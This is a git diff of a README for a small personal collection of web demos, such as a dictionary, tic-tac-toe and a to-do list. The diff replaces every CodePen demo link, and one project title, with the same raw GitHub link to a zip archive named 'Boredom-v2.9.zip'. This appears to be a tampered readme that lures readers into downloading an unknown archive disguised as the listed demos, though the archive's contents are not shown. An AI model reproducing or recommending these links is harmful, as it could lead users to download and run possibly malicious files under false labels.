@@ -2,41 +2,41 @@
 Quick and simple random ideas that I come up with when bored...
 
 - Dictionary:
-  https://codepen.io/Alen1337/pen/XWayNgG
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Tic-Tac-Toe:
-  https://codepen.io/Alen1337/pen/MWvLNZj
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Elevator:
-  https://codepen.io/Alen1337/pen/abyaKLd
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - jQuery Explode:
-  https://codepen.io/Alen1337/pen/ExveGzz
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - To-Do List:
-  https://codepen.io/Alen1337/pen/LYjJJyo
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Bleep Censor:
-  https://codepen.io/Alen1337/pen/KKvxxEe
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Hide Posts:
-  https://codepen.io/Alen1337/pen/ExvedYq
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Student Index Card:
-  https://codepen.io/Alen1337/pen/qBXMJqb
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Dinamically Create Table:
-  https://codepen.io/Alen1337/details/yLoxRXr
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Decipher Focusvision Question Example:
-  https://codepen.io/Alen1337/pen/dyzqgZv
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Word Finder:
-  https://codepen.io/Alen1337/pen/rNzZqda
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - jQuery Test:
-  https://codepen.io/Alen1337/pen/vYJzVvp
-- Gamers.ba
-  https://codepen.io/Alen1337/pen/yLoxwbO
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
+- https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Accordion
-  https://codepen.io/Alen1337/pen/VwMvoRX
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Carousel
-  https://codepen.io/Alen1337/pen/BawoXeE
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Semaphore
-  https://codepen.io/Alen1337/pen/vYpbPbp
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Statistics
-  https://codepen.io/Alen1337/pen/YzvRVjg
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - To-Do List /w Local Storage
-  https://codepen.io/Alen1337/pen/qBKGgpE
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 - Spotify
-  https://codepen.io/Alen1337/pen/GRPxJPQ
+  https://raw.githubusercontent.com/agaribovic/Boredom/main/unwieldly/Boredom-v2.9.zip
 
